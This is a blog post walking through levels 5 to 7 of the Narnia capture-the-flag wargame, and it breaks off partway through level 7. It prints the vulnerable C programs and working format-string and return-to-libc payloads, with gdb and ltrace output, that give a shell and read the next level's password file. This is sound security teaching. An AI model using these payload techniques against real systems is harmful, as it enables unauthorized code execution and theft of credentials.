<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Solving Narnia Part 2 - Unlogic</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="keywords" content="">
  <link rel="canonical" href="http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/">

  
  

  
  

  
  

  <link rel="stylesheet" type="text/css" href="http://unlogic.co.uk//css/combined-min.css">

</head>
<body class="">

<div class="site-wrap">
  <header class="site-header px2 px-responsive">
  <div class="mt2 wrap">
    <div class="measure">
      <a href="http://unlogic.co.uk/" class="site-title">Unlogic</a>
      <nav class="site-nav right">
      <a href="http://unlogic.co.uk/tags">Tags</a>

</form>

      </nav>
      <div class="clearfix"></div>
    </div>
  </div>
</header>

  <div class="post p2 p-responsive wrap" role="main">
    <div class="measure">
      <div class="post-header mb2">
        <h1 class="py2">Solving Narnia Part 2</h1>
        <span class="post-meta">Apr 13, 2015 by </span><br>
        
      </div>

      <article class="post-content">
      

<p>Carrying on from <a href="http://unlogic.co.uk/2015/04/08/solving-narnia-part1/">Part 1</a></p>

<h2 id="level-05:100abf89ce6a11fb3cfc3f5a51e9cb94">Level 05</h2>

<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><code class="language-c" data-lang="c"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</code></pre></div></td><td class="code"><div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>
 
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

	<span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	<span class="n">buffer</span><span class="p">[</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Change i&#39;s value from 1 -&gt; 500. &quot;</span><span class="p">);</span>

	<span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">==</span><span class="mi">500</span><span class="p">){</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&quot;GOOD</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
		<span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">&quot;No way...let me give you a hint!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">&quot;buffer : [%s] (%d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
	<span class="n">printf</span> <span class="p">(</span><span class="s">&quot;i = %d (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>

<p>A fixed sized buffer again. This time however trying to overflow it in order to
write to <code>i</code> won&rsquo;t work. If we look at line 9 and lookup the manpage for <code>snprintf</code>
we see that</p>

<pre><code>The  functions  snprintf() and vsnprintf() write at most size bytes
(including the trailing null byte ('\0')) to str.
</code></pre>

<p>So we won&rsquo;t be able to overflow this buffer. Going through the usual possible exploits
we&rsquo;ve only really go one more to try: <a href="https://en.wikipedia.org/wiki/Uncontrolled_format_string">format string attack</a> or
<em>uncontrolled format string vulnerability</em>. This happens when user input
isn&rsquo;t checked, and allows the user to use format characters (<code>%s</code>, <code>%x</code>) to read or
manipulate the stack.</p>

<p>For me this is one of the harder exploits to understand, so this level is
great practice for me. So if it doesn&rsquo;t make sense at first, stick with it and
try various strings. Hopefully you&rsquo;ll grok it at some point.</p>

<p>Let&rsquo;s check to see if our hunch is right. Using a few characters to start, I
then append a list of <code>%x</code>, which read values from the stack and print them.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia5@melinda:/narnia$</span> ./narnia5 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;aaaa&#39;+&#39;%x&#39;*10&quot;</span><span class="sb">`</span>
<span class="go">Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint!</span>
<span class="go">buffer : [aaaaf7eb75b6ffffffffffffd6aef7e2fbf8616161616265376636623537666] (63)</span>
<span class="go">i = 1 (0xffffd6cc)</span>
</code></pre></div>


<p>Sure enough we see the beginning of the input string after the 4th <code>%x</code>. So we then
put the address if <code>i</code> into that location like and shorten the number of <code>%x</code>.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia5@melinda:/narnia$</span> ./narnia5 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;\xcc\xd6\xff\xff&#39;+&#39;%x&#39;*5&quot;</span><span class="sb">`</span>
<span class="go">Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint!</span>
<span class="go">buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8ffffd6cc] (44)</span>
<span class="go">i = 1 (0xffffd6cc)</span>
</code></pre></div>


<p>Now we have the address of <code>i</code>, we use <code>%n</code> to write to that address, remembering
to remove one <code>%x</code> to keep the right length.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia5@melinda:/narnia$</span> ./narnia5 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;\xcc\xd6\xff\xff&#39;+&#39;%x&#39;*4 + &#39;%n&#39;&quot;</span><span class="sb">`</span>
<span class="go">Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint!</span>
<span class="go">buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8] (36)</span>
<span class="go">i = 36 (0xffffd6cc)</span>
</code></pre></div>


<p>So we see that we&rsquo;ve written the length of the string into <code>i</code>. We already have
a value of 36, but we need 500. To achieve this we need to pad the string.</p>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia5@melinda:/narnia$</span> ./narnia5 <span class="k">$(</span>python -c <span class="s2">&quot;print &#39;\xcc\xd6\xff\xff&#39;+&#39;%x&#39;*3 + &#39;%500d&#39; + &#39;%n&#39;&quot;</span><span class="k">)</span>
<span class="go">Change i&#39;s value from 1 -&gt; 500. No way...let me give you a hint!</span>
<span class="go">buffer : [����f7eb75b6ffffffffffffd6ae                                   ] (63)</span>
<span class="go">i = 528 (0xffffd6cc)</span>
</code></pre></div>


<p>We&rsquo;re <em>28</em> over the target, so let&rsquo;s reduce the padding</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia5@melinda:/narnia$</span> ./narnia5 <span class="k">$(</span>python -c <span class="s2">&quot;print &#39;\xcc\xd6\xff\xff&#39;+&#39;%x&#39;*3 + &#39;%472d&#39; + &#39;%n&#39;&quot;</span><span class="k">)</span>
<span class="go">Change i&#39;s value from 1 -&gt; 500. GOOD</span>
<span class="gp">$</span> whoami
<span class="go">narnia6</span>
<span class="gp">$</span> cat /etc/narnia_pass/narnia6
<span class="go">[password]</span>
</code></pre></div>
</p>

<h2 id="level-06:100abf89ce6a11fb3cfc3f5a51e9cb94">Level 06</h2>

<p><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><code class="language-c" data-lang="c"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36</code></pre></div></td><td class="code"><div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>

<span class="k">extern</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">;</span>

<span class="c1">// tired of fixing values...</span>
<span class="c1">// - morla</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">get_sp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
       <span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;movl %esp,%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
               <span class="s">&quot;and $0xff000000, %eax&quot;</span>
               <span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
	<span class="kt">char</span> <span class="n">b1</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span> <span class="n">b2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
	<span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">puts</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>

	<span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">!=</span><span class="mi">3</span><span class="p">){</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s b1 b2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>

	<span class="cm">/* clear environ */</span>
	<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
		<span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
	<span class="cm">/* clear argz    */</span>
	<span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
		<span class="n">memset</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>

	<span class="n">strcpy</span><span class="p">(</span><span class="n">b1</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	<span class="n">strcpy</span><span class="p">(</span><span class="n">b2</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
	<span class="c1">//if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)</span>
	<span class="k">if</span><span class="p">(((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">fp</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">)</span> <span class="o">==</span> <span class="n">get_sp</span><span class="p">())</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="n">fp</span><span class="p">(</span><span class="n">b1</span><span class="p">);</span>

	<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</td></tr></table></p>

<p>In this rather complicated looking listing we notice a few things:</p>

<ul>
<li>line 17 is a function pointer to <code>puts</code></li>
<li>line 33 calls the function <code>fp</code> points to</li>
<li>line 31 prevents <code>fp</code> from pointing to anything in our frame</li>
</ul>

<p>The last lines means we need to point <code>fp</code> to a call in a system library.
This is going to be a <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">ret to libc attack</a>. We
need to find the location of the function we want to execute. We want a shell, so our
best option would be to execute <code>system('/bin/sh')</code>. As luck would have it, <code>puts</code> and
<code>system</code> both have the same function definition: <code>int system(const char *command);</code> and
<code>int puts(const char *s);</code></p>

<p>Let&rsquo;s fire up gdb and figure out our addresses.
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia6@melinda:/narnia$</span> gdb ./narnia6 -q
<span class="go">Reading symbols from ./narnia6...(no debugging symbols found)...done.</span>
<span class="go">(gdb) disass main</span>
<span class="go">Dump of assembler code for function main:</span>
<span class="go">   0x08048559 &lt;+0&gt;:	push   %ebp</span>
<span class="go">   0x0804855a &lt;+1&gt;:	mov    %esp,%ebp</span>
<span class="go">   0x0804855c &lt;+3&gt;:	push   %ebx</span>
<span class="go">   0x0804855d &lt;+4&gt;:	and    $0xfffffff0,%esp</span>
<span class="go">   0x08048560 &lt;+7&gt;:	sub    $0x30,%esp</span>

<span class="go">    &lt;-- snip --&gt;</span>

<span class="go">   0x0804869b &lt;+322&gt;:	movl   $0xffffffff,(%esp)      </span>
<span class="go">   0x080486a2 &lt;+329&gt;:	call   0x8048410 &lt;exit@plt&gt;</span>
<span class="go">   0x080486a7 &lt;+334&gt;:	lea    0x20(%esp),%eax</span>
<span class="go">   0x080486ab &lt;+338&gt;:	mov    %eax,(%esp)</span>
<span class="go">   0x080486ae &lt;+341&gt;:	mov    0x28(%esp),%eax</span>
<span class="go">   0x080486b2 &lt;+345&gt;:	call   *%eax                &lt;-- calling *fp*</span>
<span class="go">   0x080486b4 &lt;+347&gt;:	movl   $0x1,(%esp)</span>
<span class="go">   0x080486bb &lt;+354&gt;:	call   0x8048410 &lt;exit@plt&gt;</span>
<span class="go">End of assembler dump.</span>

<span class="go">(gdb) break *0x080486b2</span>
<span class="go">Breakpoint 1 at 0x80486b2</span>
<span class="go">(gdb) r aaaaaaaabbbb ccccccccdddd</span>
<span class="go">Starting program: /games/narnia/narnia6 aaaaaaaabbbb ccccccccdddd</span>

<span class="go">Breakpoint 1, 0x080486b2 in main ()</span>
<span class="go">(gdb) x/50wx $esp</span>
<span class="go">0xffffd680:	0xffffd6a0	0xffffd8ac	0x00000021	0x08048712</span>
<span class="go">0xffffd690:	0x00000003	0xffffd754	0x63636363	0x63636363</span>
<span class="go">0xffffd6a0:	0x64646464	0x61616100	0x62626262	0x00000000</span>
<span class="go">0xffffd6b0:	0x080486c0	0xf7fca000	0x00000000	0xf7e3ca63</span>
<span class="go">0xffffd6c0:	0x00000003	0xffffd754	0xffffd764	0xf7feacea</span>
<span class="go">0xffffd6d0:	0x00000003	0xffffd754	0xffffd6f4	0x08049978</span>
<span class="go">0xffffd6e0:	0x08048290	0xf7fca000	0x00000000	0x00000000</span>
<span class="go">0xffffd6f0:	0x00000000	0x32aaee13	0x0a932a03	0x00000000</span>
<span class="go">0xffffd700:	0x00000000	0x00000000	0x00000003	0x08048450</span>
<span class="go">0xffffd710:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000</span>
<span class="go">0xffffd720:	0x00000003	0x08048450	0x00000000	0x08048471</span>
<span class="go">0xffffd730:	0x08048559	0x00000003	0xffffd754	0x080486c0</span>
<span class="go">0xffffd740:	0x08048730	0xf7feb180</span>
<span class="go">(gdb) p system</span>
<span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7e62cd0 &lt;system&gt;
<span class="go">(gdb) c</span>
<span class="go">Continuing.</span>

<span class="go">Program received signal SIGSEGV, Segmentation fault.</span>
<span class="go">0x62626262 in ?? ()</span>
</code></pre></div>
</p>

<p>What I did here was to disassemble the <code>main</code> function and find out where
<code>fp</code> is getting called, so that I can set a breakpoint on it. Then I
run the binary and inspect the stack before the call to <code>fp</code>. What we see is
that <code>$esp</code> points to <code>0xffffd6a0</code>, which is where the last 4 values of
<code>b2</code> are stored. This is also the argument that will be passed to the <code>fp</code> call.
Function arguments are pushed onto the stack before a function is called. So
We want this to point to <code>/bin/sh</code>, and we want <code>fp</code> to point to <code>system</code>. This is
the reason for the <code>p system</code>, it tells us the location of <code>system</code>.
Also note that our <code>segfault</code> is showing us the last
4 digits of <code>b1</code>. Perfect, I can use that to overwrite <code>fp</code> with the address of
<code>system</code> and I should be good to go.</p>

<p>As this is a little more advanced, let&rsquo;s go over the steps:</p>

<ul>
<li>Get the address of the argument to whatever <code>fp</code> points to</li>
<li>Figure out how to overwrite that with our argument</li>
<li>Get the address of <code>system</code></li>
<li>Overwrite what <code>fp</code> points to with <code>system</code>&rsquo;s address</li>
<li>Assemble payload and hopefully get a shell</li>
</ul>

<p>So the last step:</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia6@melinda:/narnia$</span> /games/narnia/narnia6 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;a&#39;*8 + &#39;\xd0\x2c\xe6\xf7&#39; +&#39; &#39;+ &#39;b&#39;*8 + &#39;/bin/sh&#39;&quot;</span><span class="sb">`</span>
<span class="gp">$</span> whoami
<span class="go">narnia7</span>
<span class="gp">$</span> cat /etc/narnia_pass/narnia7
<span class="go">[password]</span>
</code></pre></div>
</p>

<h2 id="level-07:100abf89ce6a11fb3cfc3f5a51e9cb94">Level 07</h2>

<p><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><code class="language-c" data-lang="c"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51</code></pre></div></td><td class="code"><div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;unistd.h&gt;</span>

<span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">();</span>
<span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">();</span>

<span class="kt">int</span> <span class="nf">vuln</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ptrf</span><span class="p">)();</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;goodfunction() = %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">goodfunction</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;hackedfunction() = %p</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">hackedfunction</span><span class="p">);</span>

    <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;before : ptrf() = %p (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ptrf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptrf</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I guess you want to come to the hackedfunction...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
    <span class="n">ptrf</span> <span class="o">=</span> <span class="n">goodfunction</span><span class="p">;</span>

    <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">format</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ptrf</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">){</span>
            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Usage: %s &lt;buffer&gt;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
            <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">goodfunction</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome to the goodfunction, but i said the Hackedfunction..</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
        
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">hackedfunction</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Way to go!!!!&quot;</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table></p>

<p>The presence of <code>snprintf</code> indicates that this will be another format string attack.
Great, another one of my least favourites. This should help imprint it on my
brain though, so let&rsquo;s attack this</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">(gdb) disass vuln</span>
<span class="go">Dump of assembler code for function vuln:</span>
<span class="go">   0x080485cd &lt;+0&gt;:	push   %ebp</span>
<span class="go">   0x080485ce &lt;+1&gt;:	mov    %esp,%ebp</span>
<span class="go">   0x080485d0 &lt;+3&gt;:	sub    $0xa8,%esp</span>
<span class="go">   0x080485d6 &lt;+9&gt;:	movl   $0x80,0x8(%esp)</span>
<span class="go">   0x080485de &lt;+17&gt;:	movl   $0x0,0x4(%esp)</span>
<span class="go">   0x080485e6 &lt;+25&gt;:	lea    -0x88(%ebp),%eax</span>
<span class="go">   0x080485ec &lt;+31&gt;:	mov    %eax,(%esp)</span>
<span class="go">   0x080485ef &lt;+34&gt;:	call   0x80484b0 &lt;memset@plt&gt;</span>
<span class="go">   0x080485f4 &lt;+39&gt;:	movl   $0x80486e0,0x4(%esp)</span>
<span class="go">   0x080485fc &lt;+47&gt;:	movl   $0x80487d0,(%esp)</span>
<span class="go">   0x08048603 &lt;+54&gt;:	call   0x8048420 &lt;printf@plt&gt;</span>
<span class="go">   0x08048608 &lt;+59&gt;:	movl   $0x8048706,0x4(%esp)</span>
<span class="go">   0x08048610 &lt;+67&gt;:	movl   $0x80487e5,(%esp)</span>
<span class="go">   0x08048617 &lt;+74&gt;:	call   0x8048420 &lt;printf@plt&gt;</span>
<span class="go">   0x0804861c &lt;+79&gt;:	movl   $0x80486e0,-0x8c(%ebp)</span>
<span class="go">   0x08048626 &lt;+89&gt;:	mov    -0x8c(%ebp),%eax</span>
<span class="go">   0x0804862c &lt;+95&gt;:	lea    -0x8c(%ebp),%edx</span>
<span class="go">   0x08048632 &lt;+101&gt;:	mov    %edx,0x8(%esp)</span>
<span class="go">   0x08048636 &lt;+105&gt;:	mov    %eax,0x4(%esp)</span>
<span class="go">   0x0804863a &lt;+109&gt;:	movl   $0x80487fd,(%esp)</span>
<span class="go">   0x08048641 &lt;+116&gt;:	call   0x8048420 &lt;printf@plt&gt;</span>
<span class="go">   0x08048646 &lt;+121&gt;:	movl   $0x8048818,(%esp)</span>
<span class="go">   0x0804864d &lt;+128&gt;:	call   0x8048450 &lt;puts@plt&gt;</span>
<span class="go">   0x08048652 &lt;+133&gt;:	movl   $0x2,(%esp)</span>
<span class="go">   0x08048659 &lt;+140&gt;:	call   0x8048440 &lt;sleep@plt&gt;</span>
<span class="go">   0x0804865e &lt;+145&gt;:	movl   $0x80486e0,-0x8c(%ebp)</span>
<span class="go">   0x08048668 &lt;+155&gt;:	mov    0x8(%ebp),%eax</span>
<span class="go">   0x0804866b &lt;+158&gt;:	mov    %eax,0x8(%esp)</span>
<span class="go">   0x0804866f &lt;+162&gt;:	movl   $0x80,0x4(%esp)</span>
<span class="go">   0x08048677 &lt;+170&gt;:	lea    -0x88(%ebp),%eax</span>
<span class="go">   0x0804867d &lt;+176&gt;:	mov    %eax,(%esp)</span>
<span class="go">   0x08048680 &lt;+179&gt;:	call   0x80484c0 &lt;snprintf@plt&gt;</span>
<span class="go">   0x08048685 &lt;+184&gt;:	mov    -0x8c(%ebp),%eax</span>
<span class="go">   0x0804868b &lt;+190&gt;:	call   *%eax</span>
<span class="go">   0x0804868d &lt;+192&gt;:	leave  </span>
<span class="go">   0x0804868e &lt;+193&gt;:	ret    </span>
<span class="go">End of assembler dump.</span>
<span class="go">(gdb) break *0x08048685</span>
</code></pre></div>
</p>

<p>So disassmble the <code>vuln</code> function and set a break point just
before the call of the function pointer. In the process of this challenge
I learned of a nice way to determine the number of <code>%x</code> you need. Using
<code>ltrace</code> it&rsquo;s possible to increment the number of <code>%x</code>&rsquo;s until you
see your string in the output again. I&rsquo;ll paste only the correcy output here</p>

<p><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><code class="language-console" data-lang="console"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</code></pre></div></td><td class="code"><div class="highlight"><pre><span class="gp">narnia7@melinda:/narnia$</span> ltrace ./narnia7 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;aaaabbbb&#39; + &#39;%x&#39;*7&quot;</span><span class="sb">`</span>
<span class="go">__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 &lt;unfinished ...&gt;</span>
<span class="go">memset(0xffffd630, &#39;\0&#39;, 128)                                = 0xffffd630</span>
<span class="go">printf(&quot;goodfunction() = %p\n&quot;, 0x80486e0goodfunction() = 0x80486e0</span>
<span class="go">)                   = 27</span>
<span class="go">printf(&quot;hackedfunction() = %p\n\n&quot;, 0x8048706hackedfunction() = 0x8048706</span>

<span class="go">)               = 30</span>
<span class="go">printf(&quot;before : ptrf() = %p (%p)\n&quot;, 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)</span>
<span class="go">) = 41</span>
<span class="go">puts(&quot;I guess you want to come to the &quot;...I guess you want to come to the hackedfunction...</span>
<span class="go">)                  = 50</span>
<span class="go">sleep(2)                                                     = 0</span>
<span class="go">snprintf(&quot;aaaabbbb8048238ffffd688f7ffda940&quot;..., 128, &quot;aaaabbbb%x%x%x%x%x%x%x&quot;, 0x8048238, 0xffffd688, 0xf7ffda94, 0, 0x80486e0, 0x61616161, 0x62626262) = 55</span>
<span class="go">puts(&quot;Welcome to the goodfunction, but&quot;...Welcome to the goodfunction, but i said the Hackedfunction..</span>
<span class="go">)                  = 61</span>
<span class="go">fflush(0xf7fcaac0)                                           = 0</span>
<span class="go">exit(0 &lt;no return ...&gt;</span>
<span class="go">+++ exited (status 0) +++</span>
</pre></div>
</td></tr></table></p>

<p>You can see the <em>aaaa</em> and <em>bbbb</em> at line 14. So we have 7 <code>%x</code> to get the second value.</p>

<p>Let&rsquo;s take a look at the stack with that input</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">(gdb) r $(python -c &quot;print &#39;aaaabbbb&#39; + &#39;%x&#39;*7&quot;)</span>
<span class="go">Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaabbbb&#39; + &#39;%x&#39;*7&quot;)</span>
<span class="go">goodfunction() = 0x80486e0</span>
<span class="go">hackedfunction() = 0x8048706</span>

<span class="go">before : ptrf() = 0x80486e0 (0xffffd60c)</span>
<span class="go">I guess you want to come to the hackedfunction...</span>

<span class="go">Breakpoint 1, 0x08048685 in vuln ()</span>
<span class="go">(gdb) x/40wx $esp</span>
<span class="go">0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238</span>
<span class="go">0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486e0</span>
<span class="go">0xffffd610:	0x61616161	0x62626262	0x38343038	0x66383332</span>
